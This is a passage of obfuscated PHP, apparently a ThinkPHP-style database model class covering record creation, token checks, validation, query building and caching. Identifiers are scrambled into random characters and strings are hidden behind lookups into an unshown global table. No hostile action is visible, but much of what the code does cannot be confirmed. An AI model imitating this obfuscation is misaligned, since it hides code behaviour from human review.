$¯®‘„öû : 1; } if ($¯®‘„öû === $‡›ğö–ı[334]) { unset($ã›€æß©[$‡›ğö–ı[370]]); } $Œ€³©‘¤ = $this->db->select($ã›€æß©); if (!empty($Œ€³©‘¤)) { if ($¯®‘„öû === $‡›ğö–ı[334]) { return reset($Œ€³©‘¤[0]); } if (!0 !== $¯®‘„öû && 1 == $ã›€æß©[$‡›ğö–ı[370]]) { return reset($Œ€³©‘¤[0]); } foreach ($Œ€³©‘¤ as $è«ØÕı) { $ĞÇ×´Õø[] = $è«ØÕı[$ıšÑÔ·]; } return $ĞÇ×´Õø; } } return null; } public function create($“ğõó¤” = '', $ëØÛĞºô = '') { $ÙøåÈªö =& $_SERVER[Ï×Œõ”û]; if (empty($“ğõó¤”)) { $“ğõó¤” = $_POST; } elseif (is_object($“ğõó¤”)) { $“ğõó¤” = get_object_vars($“ğõó¤”); } if (empty($“ğõó¤”) || !is_array($“ğõó¤”)) { $this->error = think_lang($ÙøåÈªö[351]); return !1; } $“ğõó¤” = $this->parseFieldsMap($“ğõó¤”, 0); $ëØÛĞºô = $ëØÛĞºô ? $ëØÛĞºô : (!empty($“ğõó¤”[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÙøåÈªö[353]])) { $Œ×öµªÈ = $this->options[$ÙøåÈªö[353]]; unset($this->options[$ÙøåÈªö[353]]); } elseif ($ëØÛĞºô == THINK_MODEL_INSERT && isset($this->insertFields)) { $Œ×öµªÈ = $this->insertFields; } elseif ($ëØÛĞºô == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Œ×öµªÈ = $this->updateFields; } if (isset($Œ×öµªÈ)) { if (is_string($Œ×öµªÈ)) { $Œ×öµªÈ = explode($ÙøåÈªö[50], $Œ×öµªÈ); } if (think_config($ÙøåÈªö[375])) { $Œ×öµªÈ[] = think_config($ÙøåÈªö[376]); } foreach ($“ğõó¤” as $ŞåÅŸ” => $ÇÔß¶…‰) { if (!in_array($ŞåÅŸ”, $Œ×öµªÈ)) { unset($“ğõó¤”[$ŞåÅŸ”]); } } } if (!$this->autoValidation($“ğõó¤”, $ëØÛĞºô)) { return !1; } if (!$this->autoCheckToken($“ğõó¤”)) { $this->error = think_lang($ÙøåÈªö[377]); return !1; } if ($this->autoCheckFields) { $Œ×öµªÈ = $this->getDbFields(); foreach ($“ğõó¤” as $ŞåÅŸ” => $ÇÔß¶…‰) { if (!in_array($ŞåÅŸ”, $Œ×öµªÈ)) { unset($“ğõó¤”[$ŞåÅŸ”]); } elseif (MAGIC_QUOTES_GPC && is_string($ÇÔß¶…‰)) { $“ğõó¤”[$ŞåÅŸ”] = stripslashes($ÇÔß¶…‰); } } } $this->autoOperation($“ğõó¤”, $ëØÛĞºô); $this->data = $“ğõó¤”; return $“ğõó¤”; } public function autoCheckToken($óº—ˆ’) { $¾¶Óñù„ =& $_SERVER[Ï×Œõ”û]; if (isset($this->options[$¾¶Óñù„[378]]) && !$this->options[$¾¶Óñù„[378]]) { return !0; } if (think_config($¾¶Óñù„[375])) { $Úãñâ¶Î = think_config($¾¶Óñù„[376]); if (!isset($óº—ˆ’[$Úãñâ¶Î]) || Session::get($Úãñâ¶Î)) { return !1; } list($µ«¥ïÖç, $ ßÄøù®) = explode($¾¶Óñù„[11], $óº—ˆ’[$Úãñâ¶Î]); if ($ ßÄøù® && Session::get($Úãñâ¶Î . $¾¶Óñù„[10] . $µ«¥ïÖç) === $ ßÄøù®) { Session::remove($Úãñâ¶Î . $¾¶Óñù„[10] . $µ«¥ïÖç); return !0; } if (think_config($¾¶Óñù„[379])) { Session::remove($Úãñâ¶Î . $¾¶Óñù„[10] . $µ«¥ïÖç); } return !1; } return !0; } public function regex($©›­áá§, $¦•ÁŸ¶Ï) { $¡Ğ‚ˆÃô =& $_SERVER[Ï×Œõ”û]; $­Èğ‡…Í = array($¡Ğ‚ˆÃô[380] => $¡Ğ‚ˆÃô[381], $¡Ğ‚ˆÃô[382] => $¡Ğ‚ˆÃô[383], $¡Ğ‚ˆÃô[384] => $¡Ğ‚ˆÃô[385], $¡Ğ‚ˆÃô[386] => $¡Ğ‚ˆÃô[387], $¡Ğ‚ˆÃô[388] => $¡Ğ‚ˆÃô[389], $¡Ğ‚ˆÃô[390] => $¡Ğ‚ˆÃô[391], $¡Ğ‚ˆÃô[392] => $¡Ğ‚ˆÃô[393], $¡Ğ‚ˆÃô[368] => $¡Ğ‚ˆÃô[394], $¡Ğ‚ˆÃô[395] => $¡Ğ‚ˆÃô[396]); if (isset($­Èğ‡…Í[strtolower($¦•ÁŸ¶Ï)])) { $¦•ÁŸ¶Ï = $­Èğ‡…Í[strtolower($¦•ÁŸ¶Ï)]; } return preg_match($¦•ÁŸ¶Ï, $©›­áá§) === 1; } private function autoOperation(&$‡›ã¨«¡, $—š„ÒêÏ) { $²ºÊÉÚ =& $_SERVER[Ï×Œõ”û]; if (!empty($this->options[$²ºÊÉÚ[397]])) { $ç…»£¹× = $this->options[$²ºÊÉÚ[397]]; unset($this->options[$²ºÊÉÚ[397]]); } elseif (!empty($this->_auto)) { $ç…»£¹× = $this->_auto; } if (isset($ç…»£¹×)) { foreach ($ç…»£¹× as $ÁòìÄ×‚) { if (empty($ÁòìÄ×‚[2])) { $ÁòìÄ×‚[2] = THINK_MODEL_INSERT; } if ($—š„ÒêÏ == $ÁòìÄ×‚[2] || $ÁòìÄ×‚[2] == THINK_MODEL_BOTH) { switch (trim($ÁòìÄ×‚[3])) { case $²ºÊÉÚ[398]: case $²ºÊÉÚ[399]: $€«éóİ£ = isset($ÁòìÄ×‚[4]) ? (array) $ÁòìÄ×‚[4] : array(); if (isset($‡›ã¨«¡[$ÁòìÄ×‚[0]])) { array_unshift($€«éóİ£, $‡›ã¨«¡[$ÁòìÄ×‚[0]]); } if ($²ºÊÉÚ[398] == $ÁòìÄ×‚[3]) { $‡›ã¨«¡[$ÁòìÄ×‚[0]] = call_user_func_array($ÁòìÄ×‚[1], $€«éóİ£); } else { $‡›ã¨«¡[$ÁòìÄ×‚[0]] = call_user_func_array(array(&$this, $ÁòìÄ×‚[1]), $€«éóİ£); } break; case $²ºÊÉÚ[353]: $‡›ã¨«¡[$ÁòìÄ×‚[0]] = $‡›ã¨«¡[$ÁòìÄ×‚[1]]; break; case $²ºÊÉÚ[400]: if ($²ºÊÉÚ[12] === $‡›ã¨«¡[$ÁòìÄ×‚[0]]) { unset($‡›ã¨«¡[$ÁòìÄ×‚[0]]); } break; case $²ºÊÉÚ[401]: default: $‡›ã¨«¡[$ÁòìÄ×‚[0]] = $ÁòìÄ×‚[1]; } if (!1 === $‡›ã¨«¡[$ÁòìÄ×‚[0]]) { unset($‡›ã¨«¡[$ÁòìÄ×‚[0]]); } } } } return $‡›ã¨«¡; } protected function autoValidation($Ùæ³óÇ¼, $ú·æ) { $¶„¾½ñô =& $_SERVER[Ï×Œõ”û]; if (!empty($this->options[$¶„¾½ñô[402]])) { $Ê¸Ú¹ƒ = $this->options[$¶„¾½ñô[402]]; unset($this->options[$¶„¾½ñô[402]]); } elseif (!empty($this->_validate)) { $Ê¸Ú¹ƒ = $this->_validate; } if (isset($Ê¸Ú¹ƒ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ê¸Ú¹ƒ as $åâÚÕÁö => $¢Æéøş) { if (empty($¢Æéøş[5]) || $¢Æéøş[5] == THINK_MODEL_BOTH || $¢Æéøş[5] == $ú·æ) { if (0 == strpos($¢Æéøş[2], $¶„¾½ñô[403]) && strpos($¢Æéøş[2], $¶„¾½ñô[404])) { $¢Æéøş[2] = think_lang(substr($¢Æéøş[2], 2, -1)); } $¢Æéøş[3] = isset($¢Æéøş[3]) ? $¢Æéøş[3] : THINK_EXISTS_VALIDATE; $¢Æéøş[4] = isset($¢Æéøş[4]) ? $¢Æéøş[4] : $¶„¾½ñô[405]; switch ($¢Æéøş[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ùæ³óÇ¼, $¢Æéøş)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¶„¾½ñô[12] != trim($Ùæ³óÇ¼[$¢Æéøş[0]])) { if (!1 === $this->_validationField($Ùæ³óÇ¼, $¢Æéøş)) { return !1; } } break; default: if (isset($Ùæ³óÇ¼[$¢Æéøş[0]])) { if (!1 === $this->_validationField($Ùæ³óÇ¼, $¢Æéøş)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($’Ğ¨î¹¨, $·Ò³Ø®¹) { if (!1 === $this->_validationFieldItem($’Ğ¨î¹¨, $·Ò³Ø®¹)) { if ($this->patchValidate) { $this->error[$·Ò³Ø®¹[0]] = $·Ò³Ø®¹[2]; } else { $this->error = $·Ò³Ø®¹[2]; return !1; } } return; } protected function _validationFieldItem($¶Í¡ĞÓâ, $íû„Ñ) { $Í´‘ãõ‚ =& $_SERVER[Ï×Œõ”û]; switch (strtolower(trim($íû„Ñ[4]))) { case $Í´‘ãõ‚[398]: case $Í´‘ãõ‚[399]: $©‹òÕÊì = isset($íû„Ñ[6]) ? (array) $íû„Ñ[6] : array(); if (is_string($íû„Ñ[0]) && strpos($íû„Ñ[0], $Í´‘ãõ‚[50])) { $íû„Ñ[0] = explode($Í´‘ãõ‚[50], $íû„Ñ[0]); } if (is_array($íû„Ñ[0])) { foreach ($íû„Ñ[0] as $’¯—ƒ) { $ŠŸçà§²[$’¯—ƒ] = $¶Í¡ĞÓâ[$’¯—ƒ]; } array_unshift($©‹òÕÊì, $ŠŸçà§²); } else { array_unshift($©‹òÕÊì, $¶Í¡ĞÓâ[$íû„Ñ[0]]); } if ($Í´‘ãõ‚[398] == $íû„Ñ[4]) { return call_user_func_array($íû„Ñ[1], $©‹òÕÊì); } else { return call_user_func_array(array(&$this, $íû„Ñ[1]), $©‹òÕÊì); } case $Í´‘ãõ‚[406]: return $¶Í¡ĞÓâ[$íû„Ñ[0]] == $¶Í¡ĞÓâ[$íû„Ñ[1]]; case $Í´‘ãõ‚[407]: if (is_string($íû„Ñ[0]) && strpos($íû„Ñ[0], $Í´‘ãõ‚[50])) { $íû„Ñ[0] = explode($Í´‘ãõ‚[50], $íû„Ñ[0]); } $¯ ×ÁÉ† = array(); if (is_array($íû„Ñ[0])) { foreach ($íû„Ñ[0] as $’¯—ƒ) { $¯ ×ÁÉ†[$’¯—ƒ] = $¶Í¡ĞÓâ[$’¯—ƒ]; } } else { $¯ ×ÁÉ†[$íû„Ñ[0]] = $¶Í¡ĞÓâ[$íû„Ñ[0]]; } if (!empty($¶Í¡ĞÓâ[$this->getPk()])) { $¯ ×ÁÉ†[$this->getPk()] = array($Í´‘ãõ‚[408], $¶Í¡ĞÓâ[$this->getPk()]); } if ($this->where($¯ ×ÁÉ†)->find()) { return !1; } return !0; default: return $this->check($¶Í¡ĞÓâ[$íû„Ñ[0]], $íû„Ñ[1], $íû„Ñ[4]); } } public function check($ù¨¨¡â¡, $Şøá€, $Šë‰ò = "\162\145\147\145\x78") { $ ó¢Ö =& $_SERVER[Ï×Œõ”û]; $Šë‰ò = strtolower(trim($Šë‰ò)); switch ($Šë‰ò) { case $ ó¢Ö[7]: case $ ó¢Ö[409]: $‚À éöÅ = is_array($Şøá€) ? $Şøá€ : explode($ ó¢Ö[50], $Şøá€); return $Šë‰ò == $ ó¢Ö[7] ? in_array($ù¨¨¡â¡, $‚À éöÅ) : !in_array($ù¨¨¡â¡, $‚À éöÅ); case $ ó¢Ö[410]: case $ ó¢Ö[411]: if (is_array($Şøá€)) { $ºıø²µá = $Şøá€[0]; $×ôà¦¼Ò = $Şøá€[1]; } else { list($ºıø²µá, $×ôà¦¼Ò) = explode($ ó¢Ö[50], $Şøá€); } return $Šë‰ò == $ ó¢Ö[410] ? $ù¨¨¡â¡ >= $ºıø²µá && $ù¨¨¡â¡ <= $×ôà¦¼Ò : $ù¨¨¡â¡ < $ºıø²µá || $ù¨¨¡â¡ > $×ôà¦¼Ò; case $ ó¢Ö[412]: case $ ó¢Ö[413]: return $Šë‰ò == $ ó¢Ö[412] ? $ù¨¨¡â¡ == $Şøá€ : $ù¨¨¡â¡ != $Şøá€; case $ ó¢Ö[414]: $æ ›‰Ş˜ = mb_strlen($ù¨¨¡â¡, $ ó¢Ö[415]); if (strpos($Şøá€, $ ó¢Ö[50])) { list($ºıø²µá, $×ôà¦¼Ò) = explode($ ó¢Ö[50], $Şøá€); return $æ ›‰Ş˜ >= $ºıø²µá && $æ ›‰Ş˜ <= $×ôà¦¼Ò; } else { return $æ ›‰Ş˜ == $Şøá€; } case $ ó¢Ö[416]: list($ş úÏ·, $ÛÌÈéíÅ) = explode($ ó¢Ö[50], $Şøá€); if (!is_numeric($ş úÏ·)) { $ş úÏ· = strtotime($ş úÏ·); } if (!is_numeric($ÛÌÈéíÅ)) { $ÛÌÈéíÅ = strtotime($ÛÌÈéíÅ); } return NOW_TIME >= $ş úÏ· && NOW_TIME <= $ÛÌÈéíÅ; case $ ó¢Ö[417]: return in_array(get_client_ip(), explode($ ó¢Ö[50], $Şøá€)); case $ ó¢Ö[418]: return !in_array(get_client_ip(), explode($ ó¢Ö[50], $Şøá€)); case $ ó¢Ö[405]: default: return $this->regex($ù¨¨¡â¡, $Şøá€); } } public function query($ÙıĞôŸ©, $Ùøì¥Ò¾ = false) { $£œÓÌ·— =& $_SERVER[Ï×Œõ”û]; if (!is_bool($Ùøì¥Ò¾) && !is_array($Ùøì¥Ò¾)) { $Ùøì¥Ò¾ = func_get_args(); array_shift($Ùøì¥Ò¾); } $ÙıĞôŸ© = str_replace(array($£œÓÌ·—[287], $£œÓÌ·—[419]), $£œÓÌ·—[53], $ÙıĞôŸ©); $ÙıĞôŸ© = $this->parseSql($ÙıĞôŸ©, $Ùøì¥Ò¾); return $this->db->query($ÙıĞôŸ©); } public function execute($š–¥Ûş, $Ï—Œó¯— = false) { if (!is_bool($Ï—Œó¯—) && !is_array($Ï—Œó¯—)) { $Ï—Œó¯— = func_get_args(); array_shift($Ï—Œó¯—); } $š–¥Ûş = $this->parseSql($š–¥Ûş, $Ï—Œó¯—); return $this->db->execute($š–¥Ûş); } protected function parseSql($şÒ€™™, $äÌÈÓ­) { $à·µÔ¿ã =& $_SERVER[Ï×Œõ”û]; if (!0 === $äÌÈÓ­) { $‰®ƒ¢Œİ = $this->_parseOptions(); $şÒ€™™ = $this->db->parseSql($şÒ€™™, $‰®ƒ¢Œİ); } elseif (is_array($äÌÈÓ­)) { $äÌÈÓ­ = array_map(array($this->db, $à·µÔ¿ã[420]), $äÌÈÓ­); $şÒ€™™ = vsprintf($şÒ€™™, $äÌÈÓ­); } else { $şÒ€™™ = strtr($şÒ€™™, array($à·µÔ¿ã[421] => $this->getTableName(), $à·µÔ¿ã[422] => think_config($à·µÔ¿ã[323]))); } $this->db->setModel($this->name); return $şÒ€™™; } public function db($–­ò©ß÷ = '', $Ä¾İ¥€ = '', $°ÇØÎñó = array()) { $ä“şÑ— =& $_SERVER[Ï×Œõ”û]; if ($ä“şÑ—[12] === $–­ò©ß÷ && $this->db) { return $this->db; } static $´ÈíÚ™ = array(); static $„¡¨Ï³Ò = array(); if (!isset($„¡¨Ï³Ò[$–­ò©ß÷]) || isset($„¡¨Ï³Ò[$–­ò©ß÷]) && $Ä¾İ¥€ && $´ÈíÚ™[$–­ò©ß÷] != $Ä¾İ¥€) { if (!empty($Ä¾İ¥€) && is_string($Ä¾İ¥€) && !1 === strpos($Ä¾İ¥€, $ä“şÑ—[8])) { $Ä¾İ¥€ = think_config($Ä¾İ¥€); } $–­ò©ß÷ = think_guid($Ä¾İ¥€); $„¡¨Ï³Ò[$–­ò©ß÷] = Db::getInstance($Ä¾İ¥€); } elseif (NULL === $Ä¾İ¥€) { $„¡¨Ï³Ò[$–­ò©ß÷]->close(); unset($„¡¨Ï³Ò[$–­ò©ß÷]); return; } if (!empty($°ÇØÎñó)) { if (is_string($°ÇØÎñó)) { parse_str($°ÇØÎñó, $°ÇØÎñó); } foreach ($°ÇØÎñó as $’€ÌÊ°Ø => $êìÎ°¨) { $this->setProperty($’€ÌÊ°Ø, $êìÎ°¨); } } $´ÈíÚ™[$–­ò©ß÷] = $Ä¾İ¥€; $this->db = $„¡¨Ï³Ò[$–­ò©ß÷]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ëşØÓ•ç = get_class($this); if ($ëşØÓ•ç == $_SERVER[Ï×Œõ”û][423]) { return $this->name; } $this->name = substr($ëşØÓ•ç, 0, -5); } return $this->name; } public function getTableName() { $õ’Âñİ€ =& $_SERVER[Ï×Œõ”û]; if (empty($this->trueTableName)) { $Ñ¿ÃÖ™’ = !empty($this->tablePrefix) ? $this->tablePrefix : $õ’Âñİ€[12]; if (!empty($this->tableName)) { $Ñ¿ÃÖ™’ .= $this->tableName; } else { $Ñ¿ÃÖ™’ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ñ¿ÃÖ™’); } return (!empty($this->dbName) ? $this->dbName . $õ’Âñİ€[10] : $õ’Âñİ€[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $—Ä§¼Ä­ =& $_SERVER[Ï×Œõ”û]; return isset($this->fields[$—Ä§¼Ä­[330]]) ? $this->fields[$—Ä§¼Ä­[330]] : $this->pk; } public function getDbFields() { $»Ì‘¬¾Î =& $_SERVER[Ï×Œõ”û]; if (isset($this->options[$»Ì‘¬¾Î[359]])) { $¥§ØÓ = $this->db->getFields($this->options[$»Ì‘¬¾Î[359]]); return $¥§ØÓ ? array_keys($¥§ØÓ) : !1; } if ($this->fields) { $¥§ØÓ = $this->fields; unset($¥§ØÓ[$»Ì‘¬¾Î[329]], $¥§ØÓ[$»Ì‘¬¾Î[330]], $¥§ØÓ[$»Ì‘¬¾Î[331]], $¥§ØÓ[$»Ì‘¬¾Î[328]]); return $¥§ØÓ; } return !1; } public function data($Âª´»É = '') { $‰ŒÎíæ =& $_SERVER[Ï×Œõ”û]; if ($‰ŒÎíæ[12] === $Âª´»É && !empty($this->data)) { return $this->data; } if (is_object($Âª´»É)) { $Âª´»É = get_object_vars($Âª´»É); } elseif (is_string($Âª´»É)) { parse_str($Âª´»É, $Âª´»É); } elseif (!is_array($Âª´»É)) { think_exception(think_lang($‰ŒÎíæ[351])); } $this->data = $Âª´»É; return $this; } public function join($‡äëéÌŒ) { $çÏ–˜›– =& $_SERVER[Ï×Œõ”û]; if (is_array($‡äëéÌŒ)) { $this->options[$çÏ–˜›–[362]] = $‡äëéÌŒ; } elseif (!empty($‡äëéÌŒ)) { $this->options[$çÏ–˜›–[362]][] = $‡äëéÌŒ; } return $this; } public function union($¤ÃÕ‡¢”, $˜âÕ¶‚¿ = false) { $¼Ù¢‘€Â =& $_SERVER[Ï×Œõ”û]; if (empty($¤ÃÕ‡¢”)) { return $this; } if ($˜âÕ¶‚¿) { $this->options[$¼Ù¢‘€Â[424]][$¼Ù¢‘€Â[425]] = !0; } if (is_object($¤ÃÕ‡¢”)) { $¤ÃÕ‡¢” = get_object_vars($¤ÃÕ‡¢”); } if (is_string($¤ÃÕ‡¢”)) { $ê–Âàœ´ = $¤ÃÕ‡¢”; } elseif (is_array($¤ÃÕ‡¢”)) { if (isset($¤ÃÕ‡¢”[0])) { $this->options[$¼Ù¢‘€Â[424]] = array_merge($this->options[$¼Ù¢‘€Â[424]], $¤ÃÕ‡¢”); return $this; } else { $ê–Âàœ´ = $¤ÃÕ‡¢”; } } else { think_exception(think_lang($¼Ù¢‘€Â[351])); } $this->options[$¼Ù¢‘€Â[424]][] = $ê–Âàœ´; return $this; } public function cache($ñè¿©ø¡ = true, $ìŠ·§ı· = null, $¯ãàÅ© = '') { $¤ç‰Ğ =& $_SERVER[Ï×Œõ”û]; if (!1 !== $ñè¿©ø¡) { $this->options[$¤ç‰Ğ[426]] = array($¤ç‰Ğ[95] => $ñè¿©ø¡, $¤ç‰Ğ[416] => $ìŠ·§ı·, $¤ç‰Ğ[33] => $¯ãàÅ©); } return $this; } public function field($•º•÷è±, $êíÓË“¿ = false) { $ÛÀ­ì¦â =& $_SERVER[Ï×Œõ”û]; if (!0 === $•º•÷è±) { $íìÍ¼¯ = $this->getDbFields(); $•º•÷è± = $íìÍ¼¯ ? $íìÍ¼¯ : $ÛÀ­ì¦â[222]; } elseif ($êíÓË“¿) { if (is_string($•º•÷è±)) { $•º•÷è± = explode($ÛÀ­ì¦â[50], $•º•÷è±); } $íìÍ¼¯ = $this->getDbFields(); $•º•÷è± = $íìÍ¼¯ ? array_diff($íìÍ¼¯, $•º•÷è±) : $•º•÷è±; } $this->options[$ÛÀ­ì¦â[353]] = $•º•÷è±; return $this; } public function scope($¢Úİª²â = '', $ò‘¯¾çû = NULL) { $öùå©œ =& $_SERVER[Ï×Œõ”û]; if ($öùå©œ[12] === $¢Úİª²â) { if (isset($this->_scope[$öùå©œ[37]])) { $åòß‡æé = $this->_scope[$öùå©œ[37]]; } else { return $this; } } elseif (is_string($¢Úİª²â)) { $š›³™Í = explode($öùå©œ[50], $¢Úİª²â); $åòß‡æé = array(); foreach ($š›³™Í as $ÊúÔŠ¿ã) { if (!isset($this->_scope[$ÊúÔŠ¿ã])) { continue; } $åòß‡æé = array_merge($åòß‡æé, $this->_scope[$ÊúÔŠ¿ã]); } if (!empty($ò‘¯¾çû) && is_array($ò‘¯¾çû)) { $åòß‡æé = array_merge($åòß‡æé, $ò‘¯¾çû); } } elseif (is_array($¢Úİª²â)) { $åòß‡æé = $¢Úİª²â; } if (is_array($åòß‡æé) && !empty($åòß‡æé)) { $this->options = array_merge($this->options, array_change_key_case($åòß‡æé)); } return $this; } public function where($ïòØ•©´, $À·Ø¹á— = null) { $¨íáÜßÔ =& $_SERVER[Ï×Œõ”û]; if (!is_null($À·Ø¹á—) && is_string($ïòØ•©´)) { if (!is_array($À·Ø¹á—)) { $À·Ø¹á— = func_get_args(); array_shift($À·Ø¹á—); } $À·Ø¹á— = array_map(array($this->db, $¨íáÜßÔ[420]), $À·Ø¹á—); $ïòØ•©´ = vsprintf($ïòØ•©´, $À·Ø¹á—); } elseif (is_object($ïòØ•©´)) { $ïòØ•©´ = get_object_vars($ïòØ•©´); } elseif (is_array($ïòØ•©´)) { foreach ($ïòØ•©´ as $™‚¬âÀ‚ => $Õ×‰°ãı) { if ((is_numeric($™‚¬âÀ‚) || !$™‚¬âÀ‚) && is_string($Õ×‰°ãı)) { if (strpos($Õ×‰°ãı, $¨íáÜßÔ[427]) === 0) { continue; } think_trace($¨íáÜßÔ[428], $¨íáÜßÔ[12], $¨íáÜßÔ[49]); die; } } } if (is_string($ïòØ•©´) && $¨íáÜßÔ[12] != $ïòØ•©´) { $¬¾×…§Î = array(); $¬¾×…§Î[$¨íáÜßÔ[429]] = $ïòØ•©´; $ïòØ•©´ = $¬¾×…§Î; } if (isset($this->options[$¨íáÜßÔ[355]])) { $this->options[$¨íáÜßÔ[355]] = array_merge($this->options[$¨íáÜßÔ[355]], $ïòØ•©´); } else { $this->options[$¨íáÜßÔ[355]] = $ïòØ•©´; } return $this; } public function limit($£ıó ¶õ, $µéıƒÏ = null) { $»³µÃ¤ =& $_SERVER[Ï×Œõ”û]; $this->options[$»³µÃ¤[370]] = is_null($µéıƒÏ) ? $£ıó ¶õ : $£ıó ¶õ . $»³µÃ¤[50] . $µéıƒÏ; return $this; } public function page($ÇĞÖşŸ, $Üæî¶™› = null) { $ÁÖª¥‰ë =& $_SERVER[Ï×Œõ”û]; $this->options[$ÁÖª¥‰ë[430]] = is_null($Üæî¶™›) ? $ÇĞÖşŸ : $ÇĞÖşŸ . $ÁÖª¥‰ë[50] . $Üæî¶™›; return $this; } public function comment($Ÿ©Ø¥ñ) { $this->options[$_SERVER[Ï×Œõ”û][431]] = $Ÿ©Ø¥ñ; return $this; } public function setProperty($Ğï…„ñ, $Ê†ğÆ¼) { if (property_exists($this, $Ğï…„ñ)) { $this->{$Ğï…„ñ} = $Ê†ğÆ¼; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\171\124\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\162\164\54\165\x70\144\141\x74\145", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\x63\162\x65\x61\x74\x65\x54\151\155\145", "\164\151\x6d\x65", "\x69\x6e\x73\145\x72\x74", "\x66\165\156\143\164\x69\157\x6e")); public function setDataAuto($Œ©©±Â) { $this->dataAuto = $Œ©©±Â; } public function __construct($ıÂµ’Â = '', $…Âº˜¢î = '', $Ğ”ÆË²Õ = '') { parent::__construct($ıÂµ’Â, $…Âº˜¢î, $Ğ”ÆË²Õ); } protected $tableMeta = array(); protected function _beforeInsert(&$Úšˆøà, $Å×Ìƒğ¾) { $¿ìßšô¢ =& $_SERVER[Ï×Œõ”û]; if (!$this->checkDataAutoHas($¿ìßšô¢[432])) { return; } $this->dataBeforeFilter($Úšˆøà, $¿ìßšô¢[432]); } protected function _beforeUpdate(&$ëºÎ…é, $ÌºÔ‰ç›) { $™›—éô± =& $_SERVER[Ï×Œõ”û]; if (!$this->checkDataAutoHas($™›—éô±[433])) { return; } $this->dataBeforeFilter($ëºÎ…é, $™›—éô±[433]); } protected function _afterSelect(&$Ş™ªÎšĞ, $¾Íªü¿) { if (!is_array($Ş™ªÎšĞ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ï×Œõ”û][434])) { return; } foreach ($Ş™ªÎšĞ as &$Úú¹ğ·§) { $this->dataAfterFilter($Úú¹ğ·§); } unset($Úú¹ğ·§); } protected function _afterFind(&$¿¿½×§Ò, $äªìïƒœ) { if (!is_array($¿¿½×§Ò)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ï×Œõ”û][434])) { return; } $this->dataAfterFilter($¿¿½×§Ò); } public static function textEncode($º¾Ô¡Ìæ) { if (!$º¾Ô¡Ìæ) { return $º¾Ô¡Ìæ; } $¨‚Æ˜ = json_encode($º¾Ô¡Ìæ); $¨‚Æ˜ = preg_replace_callback($_SERVER[Ï×Œõ”û][435], function ($Ç·„ËÒ¿) { return addslashes($Ç·„ËÒ¿[0]); }, $¨‚Æ˜); return json_decode($¨‚Æ˜); } public static function textDecode($Ã„…Òè) { $ĞËœî© =& $_SERVER[Ï×Œõ”û]; if (!$Ã„…Òè) { return $Ã„…Òè; } $âÑ·é—‹ = json_encode($Ã„…Òè); $âÑ·é—‹ = preg_replace_callback($ĞËœî©[436], function ($êÛû·ñ) { return $_SERVER[Ï×Œõ”û][98]; }, $âÑ·é—‹); return json_decode($âÑ·é—‹); } public function setAutoIncrement($¡Ùß‹Ë) { $ğò‰’”Ä = array($this->getPk() => $¡Ùß‹Ë); $æî¡‹ã» = $this->data($ğò‰’”Ä)->add(); if ($æî¡‹ã») { $this->delete($æî¡‹ã»); } } public function getAutoIncrement() { $Ÿ°€‡¡Ú = $this->getTableName(); $÷è´½ˆ = $this->max($this->getPk()); $§£ÙÁßí = $this->query("\163\150\x6f\x77\40\x74\x61\142\154\145\x20\x73\164\141\164\x75\163\40\x77\x68\145\162\x65\40\x4e\x61\x6d\x65\x3d\x27{$Ÿ°€‡¡Ú}\47"); $„‡£“´Ò = $§£ÙÁßí[0][$_SERVER[Ï×Œõ”û][437]]; $ÄÑİš = max($÷è´½ˆ, $„‡£“´Ò); return $ÄÑİš; } protected function _callBefore($×˜É›Ï¥, $ƒÀ´Òâ) { return $this->cacheCallCheck($×˜É›Ï¥, $ƒÀ´Òâ, !1); } protected function _callAfter($ûŸõßü“, $¸¡´§î) { return $this->cacheCallCheck($ûŸõßü“, $¸¡´§î, !0); } protected function cacheFunctionAlias($¦ØàŞÖ ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¿Èìİıª, $Œ‘ë”ÖÕ, $Ÿú½Àó» = false) { $™„øô£ =& $_SERVER[Ï×Œõ”û]; $¡”†Œ€å = $this->cacheFunctionAlias($Œ‘ë”ÖÕ); if (!$¡”†Œ€å) { return; } foreach ($¡”†Œ€å as $ê‡‡ú => $ùí‘îõ) { $œàì° · = $ùí‘îõ[0]; $î¼Íç÷ = explode($™„øô£[50], $ùí‘îõ[1]); $ù†Û³½Ÿ = isset($ùí‘îõ[2]) ? $ùí‘îõ[2] : $™„øô£[12]; if ($¿Èìİıª == $ê‡‡ú) { return $this->cacheFunctionGet($ê‡‡ú, $œàì° ·, $ù†Û³½Ÿ); } if ($Ÿú½Àó» && in_array($¿Èìİıª, $î¼Íç÷)) { $this->cacheFunctionClear($ê‡‡ú, $œàì° ·, $ù†Û³½Ÿ); } } } public function cacheFunctionGet($Õ‰ÁÇË«, $Úµ±¬ˆæ, $ì¨›«‡ = '') { $ñÌÉ‹ìÓ =& $_SERVER[Ï×Œõ”û]; $‘Ç«Ëß‹ = $this->cacheKeyMake($Õ‰ÁÇË«, $Úµ±¬ˆæ, $ì¨›«‡); $Ûåó‚›¤ = Cache::get($‘Ç«Ëß‹); if (!is_array($Ûåó‚›¤)) { if (method_exists($this, $ñÌÉ‹ìÓ[343] . $Õ‰ÁÇË«)) { $Õ‰ÁÇË« = $ñÌÉ‹ìÓ[343] . $Õ‰ÁÇË«; } $Ûåó‚›¤ = call_user_func_array(array($this, $Õ‰ÁÇË«), array($Úµ±¬ˆæ, !0)); 